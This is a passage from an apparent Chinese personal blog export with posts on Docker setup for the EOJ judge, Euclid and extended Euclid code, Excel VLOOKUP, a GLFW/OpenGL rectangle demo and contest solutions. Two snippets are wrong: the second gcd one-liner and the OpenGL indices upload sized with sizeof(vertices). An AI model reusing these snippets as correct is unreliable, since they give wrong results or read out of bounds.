<h2 id="搭建镜像"><a href="#搭建镜像" class="headerlink" title="搭建镜像"></a>搭建镜像</h2><p>修改<code>ejudge/run/defaultspj/LANG</code>,将<code>LANG</code>文件的回车去掉。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker build .</span><br></pre></td></tr></table></figure></p>
<h2 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run -d -p 5000:5000 -v /path/to/your/run/:/ejudge/run &lt;imageName&gt;</span><br></pre></td></tr></table></figure>
<p><code>/path/to/your/run/:/ejudge/run</code>要修改成自己的<code>ejudge/run</code>的路径。</p>
<p><imageName>可以运行<code>docker images</code>进行查看，也可以是<code>&lt;image ID&gt;</code>。<br>此时登录EOJ，进入后台-&gt;Servers，点击Add Server。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">名字: 随便</span><br><span class="line">IP：Address: 127.0.0.1</span><br><span class="line">端口号: 5000</span><br><span class="line">秘钥: naive</span><br></pre></td></tr></table></figure><br>点击确定，并把这个Server设为Enable。</p>
<h1 id="判题"><a href="#判题" class="headerlink" title="判题"></a>判题</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 manage.py runserver 0.0.0.0:80 &amp; python3 manage.py qcluster</span><br></pre></td></tr></table></figure>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>发现非superuser查看题目显示<code>EOJ is closed</code>,此时打开<code>utils/site_settings.py</code>，找到<code>is_site_closed</code>函数,把<code>return True</code>改为<code>return False</code>即可。<br>发现一个问题,服务器重启后题目要重新发布，否则无法判题。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>以上，EOJ搭建完毕，后续可能有一些其他的小问题，欢迎留言。</strong></p>
]]></content>
      <categories>
        <category>Web</category>
        <category>OJ</category>
      </categories>
      <tags>
        <tag>EOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>ExGCD</title>
    <url>/post/278aaa5d/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>未完待续</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>未完待续<br><a id="more"></a></p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ll <span class="title">exgcd</span><span class="params">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x=<span class="number">1</span>,y=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ll res=exgcd(b,a%b,y,x);</span><br><span class="line">        y-=x*(a/b);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>ExGCD</tag>
      </tags>
  </entry>
  <entry>
    <title>Excel函数用法</title>
    <url>/post/bd210d73/</url>
    <content><![CDATA[<h1 id="VLOOKUP"><a href="#VLOOKUP" class="headerlink" title="VLOOKUP"></a>VLOOKUP</h1><p><strong>用途</strong>：搜索表区域首列满足条件的元素，确定待检索单元格在区域中的行序号，再进一步返回选定单元格的值。默认情况下，表是以升序排序的。</p>
<p><strong>用法</strong>：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">lookup_value</td>
<td style="text-align:left">搜索条件</td>
</tr>
<tr>
<td style="text-align:left">table_array</td>
<td style="text-align:left">搜索区域</td>
</tr>
<tr>
<td style="text-align:left">col_index_num</td>
<td style="text-align:left">待返回单元格在搜索区域中的列序号</td>
</tr>
<tr>
<td style="text-align:left">range_lookup</td>
<td style="text-align:left">匹配模式【可选】</td>
</tr>
</tbody>
</table>
</div>
<p><strong>示例</strong>：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;VLOOKUP(A2,sheet1!$B2:$O50,3,FALSE)</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>软件</category>
        <category>Excel</category>
      </categories>
  </entry>
  <entry>
    <title>GLFW</title>
    <url>/post/d2be7e8/</url>
    <content><![CDATA[<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;glad/glad.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;GLFW/glfw3.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">framebuffer_size_callback</span><span class="params">(GLFWwindow* window, <span class="keyword">int</span> width, <span class="keyword">int</span> height)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processInput</span><span class="params">(GLFWwindow* window)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> SCR_WIDTH = <span class="number">800</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> SCR_HEIGHT = <span class="number">600</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* vertexShaderSource = <span class="string">&quot;#version 460 core\n&quot;</span></span><br><span class="line"><span class="string">&quot;layout (location = 0) in vec3 aPos;\n&quot;</span></span><br><span class="line"><span class="string">&quot;void main()\n&quot;</span></span><br><span class="line"><span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line"><span class="string">&quot;   gl_Position = vec4(aPos.x, aPos.y, aPos.z, 1.0);\n&quot;</span></span><br><span class="line"><span class="string">&quot;&#125;\0&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* fragmentShaderSource = <span class="string">&quot;#version 460 core\n&quot;</span></span><br><span class="line"><span class="string">&quot;out vec4 FragColor;\n&quot;</span></span><br><span class="line"><span class="string">&quot;void main()\n&quot;</span></span><br><span class="line"><span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line"><span class="string">&quot;   FragColor = vec4(1.0f, 0.5f, 0.2f, 1.0f);\n&quot;</span></span><br><span class="line"><span class="string">&quot;&#125;\n\0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// glfw: 初始化和配置</span></span><br><span class="line">    <span class="comment">// ------------------------------</span></span><br><span class="line">    glfwInit();</span><br><span class="line">    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, <span class="number">4</span>);</span><br><span class="line">    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, <span class="number">6</span>);</span><br><span class="line">    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// glfw: Mac OS X 系统需配置以下代码</span></span><br><span class="line">    <span class="comment">// ------------------------------</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// glfw 窗口创建</span></span><br><span class="line">    <span class="comment">// --------------------</span></span><br><span class="line">    GLFWwindow* window = glfwCreateWindow(SCR_WIDTH, SCR_HEIGHT, <span class="string">&quot;LearnOpenGL&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (window == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Failed to create GLFW window&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        glfwTerminate();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    glfwMakeContextCurrent(window);</span><br><span class="line">    glfwSetFramebufferSizeCallback(window, framebuffer_size_callback);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// glad: 初始化Glad，加载所有OpenGL函数指针</span></span><br><span class="line">    <span class="comment">// ---------------------------------------</span></span><br><span class="line">    <span class="keyword">if</span> (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Failed to initialize GLAD&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建着色器</span></span><br><span class="line">    <span class="comment">// ------------------------------------</span></span><br><span class="line">    <span class="comment">// 顶点着色器</span></span><br><span class="line">    <span class="keyword">int</span> vertexShader = glCreateShader(GL_VERTEX_SHADER);</span><br><span class="line">    glShaderSource(vertexShader, <span class="number">1</span>, &amp;vertexShaderSource, <span class="literal">NULL</span>);</span><br><span class="line">    glCompileShader(vertexShader);</span><br><span class="line">    <span class="comment">// 检查着色器编译错误</span></span><br><span class="line">    <span class="keyword">int</span> success;</span><br><span class="line">    <span class="keyword">char</span> infoLog[<span class="number">512</span>];</span><br><span class="line">    glGetShaderiv(vertexShader, GL_COMPILE_STATUS, &amp;success);</span><br><span class="line">    <span class="keyword">if</span> (!success)</span><br><span class="line">    &#123;</span><br><span class="line">        glGetShaderInfoLog(vertexShader, <span class="number">512</span>, <span class="literal">NULL</span>, infoLog);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ERROR::SHADER::VERTEX::COMPILATION_FAILED\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 片段着色器</span></span><br><span class="line">    <span class="keyword">int</span> fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);</span><br><span class="line">    glShaderSource(fragmentShader, <span class="number">1</span>, &amp;fragmentShaderSource, <span class="literal">NULL</span>);</span><br><span class="line">    glCompileShader(fragmentShader);</span><br><span class="line">    <span class="comment">// 检查片段着色器编译错误</span></span><br><span class="line">    glGetShaderiv(fragmentShader, GL_COMPILE_STATUS, &amp;success);</span><br><span class="line">    <span class="keyword">if</span> (!success)</span><br><span class="line">    &#123;</span><br><span class="line">        glGetShaderInfoLog(fragmentShader, <span class="number">512</span>, <span class="literal">NULL</span>, infoLog);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ERROR::SHADER::FRAGMENT::COMPILATION_FAILED\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 连接着色器</span></span><br><span class="line">    <span class="keyword">int</span> shaderProgram = glCreateProgram();</span><br><span class="line">    glAttachShader(shaderProgram, vertexShader);</span><br><span class="line">    glAttachShader(shaderProgram, fragmentShader);</span><br><span class="line">    glLinkProgram(shaderProgram);</span><br><span class="line">    <span class="comment">// 检查连接错误</span></span><br><span class="line">    glGetProgramiv(shaderProgram, GL_LINK_STATUS, &amp;success);</span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        glGetProgramInfoLog(shaderProgram, <span class="number">512</span>, <span class="literal">NULL</span>, infoLog);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ERROR::SHADER::PROGRAM::LINKING_FAILED\n&quot;</span> &lt;&lt; infoLog &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    glDeleteShader(vertexShader);</span><br><span class="line">    glDeleteShader(fragmentShader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置顶点数据（和缓冲区）并配置顶点属性。</span></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">float</span> vertices[] = &#123;</span><br><span class="line">        <span class="number">0.5f</span>, <span class="number">0.5f</span>, <span class="number">0.0f</span>,   <span class="comment">// 右上角</span></span><br><span class="line">        <span class="number">0.5f</span>, <span class="number">-0.5f</span>, <span class="number">0.0f</span>,  <span class="comment">// 右下角</span></span><br><span class="line">        <span class="number">-0.5f</span>, <span class="number">-0.5f</span>, <span class="number">0.0f</span>, <span class="comment">// 左下角</span></span><br><span class="line">        <span class="number">-0.5f</span>, <span class="number">0.5f</span>, <span class="number">0.0f</span>   <span class="comment">// 左上角</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> indices[] = &#123; <span class="comment">// 注意索引从0开始! </span></span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="comment">// 第一个三角形</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>  <span class="comment">// 第二个三角形</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> VAO, VBO, EBO;</span><br><span class="line">    glGenVertexArrays(<span class="number">1</span>, &amp;VAO);</span><br><span class="line">    glGenBuffers(<span class="number">1</span>, &amp;VBO);</span><br><span class="line">    glGenBuffers(<span class="number">1</span>, &amp;EBO);</span><br><span class="line">    <span class="comment">// 首先绑定顶点数组对象（VAO），然后绑定并设置顶点缓冲区，然后配置顶点属性。</span></span><br><span class="line">    glBindVertexArray(VAO);</span><br><span class="line"></span><br><span class="line">    glBindBuffer(GL_ARRAY_BUFFER, VBO);</span><br><span class="line">    glBufferData(GL_ARRAY_BUFFER, <span class="keyword">sizeof</span>(vertices), vertices, GL_STATIC_DRAW);</span><br><span class="line"></span><br><span class="line">    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, EBO);</span><br><span class="line">    glBufferData(GL_ELEMENT_ARRAY_BUFFER, <span class="keyword">sizeof</span>(vertices), indices, GL_STATIC_DRAW);</span><br><span class="line"></span><br><span class="line">    glVertexAttribPointer(<span class="number">0</span>, <span class="number">3</span>, GL_FLOAT, GL_FALSE, <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">float</span>), (<span class="keyword">void</span>*)<span class="number">0</span>);</span><br><span class="line">    glEnableVertexAttribArray(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 请注意，对glVertexAttribPointer的调用将VBO注册为顶点属性的绑定顶点缓冲区对象是允许的。</span></span><br><span class="line">    <span class="comment">// 因此之后我们可以安全地解除绑定。</span></span><br><span class="line">    glBindBuffer(GL_ARRAY_BUFFER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 之后可以取消绑定VAO，这样其他VAO调用就不会意外修改此VAO，但这很少发生。</span></span><br><span class="line">    <span class="comment">// 无论如何，修改其他VAO都需要调用glBindVertexArray，因此通常在不直接需要时，我们不会取消绑定VAO（或VBO）。</span></span><br><span class="line">    glBindVertexArray(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取消注释此调用以绘制线框多边形。</span></span><br><span class="line">    <span class="comment">//glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 渲染循环中</span></span><br><span class="line">    <span class="comment">// -----------</span></span><br><span class="line">    <span class="keyword">while</span> (!glfwWindowShouldClose(window))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 输入</span></span><br><span class="line">        <span class="comment">// -----</span></span><br><span class="line">        processInput(window);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 渲染</span></span><br><span class="line">        <span class="comment">// ------</span></span><br><span class="line">        glClearColor(<span class="number">0.2f</span>, <span class="number">0.3f</span>, <span class="number">0.3f</span>, <span class="number">1.0f</span>);</span><br><span class="line">        glClear(GL_COLOR_BUFFER_BIT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 画图</span></span><br><span class="line">        glUseProgram(shaderProgram);</span><br><span class="line">        <span class="comment">// 因为只有一个VAO，因此不必每次都绑定它，但是我们这样做是为了使事情更有条理。</span></span><br><span class="line">        glBindVertexArray(VAO);</span><br><span class="line">        glDrawElements(GL_TRIANGLES, <span class="number">6</span>, GL_UNSIGNED_INT,<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// glBindVertexArray(0); // 无需每次都解除绑定。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// glfw: 交换缓冲区，轮询IO事件（按下/释放，鼠标移动）。</span></span><br><span class="line">        <span class="comment">// -------------------------------------------------------------------------------</span></span><br><span class="line">        glfwSwapBuffers(window);</span><br><span class="line">        glfwPollEvents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可选: 一旦超出其目标，则取消分配所有资源。</span></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------------</span></span><br><span class="line">    glDeleteVertexArrays(<span class="number">1</span>, &amp;VAO);</span><br><span class="line">    glDeleteBuffers(<span class="number">1</span>, &amp;VBO);</span><br><span class="line">    glDeleteBuffers(<span class="number">1</span>, &amp;EBO);</span><br><span class="line">    glDeleteProgram(shaderProgram);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// glfw: 终止并清除所有先前分配的GLFW资源。</span></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------------</span></span><br><span class="line">    glfwTerminate();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理所有输: 查询GLFW是否在此框架中 按下/释放 了相关按键并作出相应反应。</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processInput</span><span class="params">(GLFWwindow* window)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当按下Esc时，窗口关闭。</span></span><br><span class="line">    <span class="keyword">if</span> (glfwGetKey(window, GLFW_KEY_ESCAPE) == GLFW_PRESS)</span><br><span class="line">        glfwSetWindowShouldClose(window, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glfw: 当改变窗口大小时，该回调函数被执行。</span></span><br><span class="line"><span class="comment">// ---------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">framebuffer_size_callback</span><span class="params">(GLFWwindow* window, <span class="keyword">int</span> width, <span class="keyword">int</span> height)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 确保视口与新窗口维度相匹配，注意宽高将明显大于视网膜显示屏的宽高。</span></span><br><span class="line">    glViewport(<span class="number">0</span>, <span class="number">0</span>, width, height);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>计算机图形学</category>
        <category>OpenGL</category>
      </categories>
      <tags>
        <tag>OpenGL</tag>
        <tag>GLSL</tag>
      </tags>
  </entry>
  <entry>
    <title>GCD</title>
    <url>/post/2071db18/</url>
    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>欧几里得算法据说是最早的算法，用于计算最大公约数，也是数论的基础算法之一。</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>51Nod 1011：<a href="https://www.51nod.com/onlineJudge/questionCode.html#!problemId=1011">https://www.51nod.com/onlineJudge/questionCode.html#!problemId=1011</a><br><a id="more"></a></p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>)<span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">return</span> gcd(b,a%b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b==<span class="number">0</span>?b:(a%b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h1><p>扩展欧几里得</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>GCD</tag>
      </tags>
  </entry>
  <entry>
    <title>河南理工大学第九届算法程序设计大赛题解</title>
    <url>/post/ab3ec9eb/</url>
    <content><![CDATA[<h1 id="热身赛"><a href="#热身赛" class="headerlink" title="热身赛"></a>热身赛</h1><h2 id="A-三玖天下第一"><a href="#A-三玖天下第一" class="headerlink" title="A.三玖天下第一"></a>A.三玖天下第一</h2><p>题目链接: <a href="https://hpuoj.com/contest/18/problem/A/">https://hpuoj.com/contest/18/problem/A/</a><br>思路: 很水的一道题, $map$ 统计出现次数最多的数字,判断一下输出就行了.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	string s;</span><br><span class="line">	map&lt;char,int&gt;M;</span><br><span class="line">	cin&gt;&gt;s;</span><br><span class="line">	int ans&#x3D;0;</span><br><span class="line">	for(int i&#x3D;0;i&lt;s.length();i++)</span><br><span class="line">		M[s[i]]++;</span><br><span class="line">	for(int i&#x3D;&#39;0&#39;;i&lt;&#x3D;&#39;9&#39;;i++)</span><br><span class="line">		if(M[i]&gt;M[ans])ans&#x3D;i;</span><br><span class="line">	if(ans&#x3D;&#x3D;&#39;0&#39;)cout&lt;&lt;&quot;Five equal parts.&quot;&lt;&lt;endl;</span><br><span class="line">	else if(ans&#x3D;&#x3D;&#39;1&#39;)cout&lt;&lt;&quot;One flower gathers people.&quot;&lt;&lt;endl;</span><br><span class="line">	else if(ans&#x3D;&#x3D;&#39;2&#39;)cout&lt;&lt;&quot;The second is very color.&quot;&lt;&lt;endl;</span><br><span class="line">	else if(ans&#x3D;&#x3D;&#39;3&#39;)cout&lt;&lt;&quot;San Jiu tian xia di yi!&quot;&lt;&lt;endl;</span><br><span class="line">	else if(ans&#x3D;&#x3D;&#39;4&#39;)cout&lt;&lt;&quot;Four leaves kawaii.&quot;&lt;&lt;endl;</span><br><span class="line">	else cout&lt;&lt;&quot;May daughter.&quot;&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<h2 id="B-权力的游戏"><a href="#B-权力的游戏" class="headerlink" title="B.权力的游戏"></a>B.权力的游戏</h2><p>题目链接: <a href="https://hpuoj.com/contest/18/problem/B/">https://hpuoj.com/contest/18/problem/B/</a><br>思路: 仍旧是 $map$ 统计每个数字出现次数,出现次数为奇数的输出一下就行了.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int N,flag&#x3D;0;</span><br><span class="line">	map&lt;int,int&gt;M;</span><br><span class="line">	while(cin&gt;&gt;N)M[N]++;</span><br><span class="line">	map&lt;int,int&gt;::iterator it;</span><br><span class="line">	for(it&#x3D;M.begin();it!&#x3D;M.end();it++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(it-&gt;second%2)</span><br><span class="line">		&#123;</span><br><span class="line">			if(flag&#x3D;&#x3D;0)</span><br><span class="line">			&#123;</span><br><span class="line">				cout&lt;&lt;it-&gt;first;</span><br><span class="line">				flag&#x3D;1;</span><br><span class="line">			&#125;</span><br><span class="line">			else cout&lt;&lt;&#39; &#39;&lt;&lt;it-&gt;first;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h1><h2 id="A-Asia区域赛"><a href="#A-Asia区域赛" class="headerlink" title="A.Asia区域赛"></a>A.Asia区域赛</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/A/">https://hpuoj.com/contest/16/problem/A/</a><br>思路: 大水题一个,计算奖牌个数=29金+59银+87铜+11最快解题+1最佳女队+1顽强拼搏=187个,输出187即可.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">typedef long long ll;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	cout&lt;&lt;187&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="B-Asia区域制"><a href="#B-Asia区域制" class="headerlink" title="B.Asia区域制"></a>B.Asia区域制</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/B/">https://hpuoj.com/contest/16/problem/B/</a><br>思路: 二进制转十六进制,每四位转化一下输出即可,注意要先转化前面不足四位的.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">typedef long long ll;</span><br><span class="line">using namespace std;</span><br><span class="line">char x[20]&#x3D;&quot;0123456789abcdef&quot;;</span><br><span class="line">string s;</span><br><span class="line">int POW(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">	int ans&#x3D;1;</span><br><span class="line">	for(int i&#x3D;0;i&lt;b;i++)</span><br><span class="line">		ans*&#x3D;a;</span><br><span class="line">	return ans;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int T,l,ans;</span><br><span class="line">	cin&gt;&gt;T;</span><br><span class="line">	while(T--)</span><br><span class="line">	&#123;</span><br><span class="line">		ans&#x3D;0;</span><br><span class="line">		cin&gt;&gt;s;</span><br><span class="line">		l&#x3D;s.length();</span><br><span class="line">		for(int i&#x3D;l%4-1;i&gt;&#x3D;0;i--)</span><br><span class="line">			if(s[i]&#x3D;&#x3D;&#39;1&#39;)</span><br><span class="line">			ans+&#x3D;POW(2,l%4-i-1);</span><br><span class="line">		if(l%4)cout&lt;&lt;x[ans];</span><br><span class="line">		for(int i&#x3D;l%4;i&lt;l;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			ans&#x3D;0;</span><br><span class="line">			for(int j&#x3D;0;j&lt;4;j++)</span><br><span class="line">				if(s[i+j]&#x3D;&#x3D;&#39;1&#39;)</span><br><span class="line">				ans+&#x3D;POW(2,3-j);</span><br><span class="line">			cout&lt;&lt;x[ans];</span><br><span class="line">			i+&#x3D;3;</span><br><span class="line">		&#125;</span><br><span class="line">		cout&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="C-Asia区域宫"><a href="#C-Asia区域宫" class="headerlink" title="C.Asia区域宫"></a>C.Asia区域宫</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/C/">https://hpuoj.com/contest/16/problem/C/</a><br>思路: 注意加粗字体 <strong>“障碍物在迷宫中不能同行且不能同列”</strong>,说明只有把与副对角线平行的路线堵死之后才输出 No ,其余情况输出皆为 2*$n$-2.<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码暂无</span><br></pre></td></tr></table></figure></p>
<h2 id="D-Asia区域阵"><a href="#D-Asia区域阵" class="headerlink" title="D.Asia区域阵"></a>D.Asia区域阵</h2><p>题目链接: <a href="https://hpuoj.com/contest/16/problem/D/">https://hpuoj.com/contest/16/problem/D/</a><br>思路: 思路暂无<br>代码:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码暂无</span><br></pre></td></tr></table></figure></p>
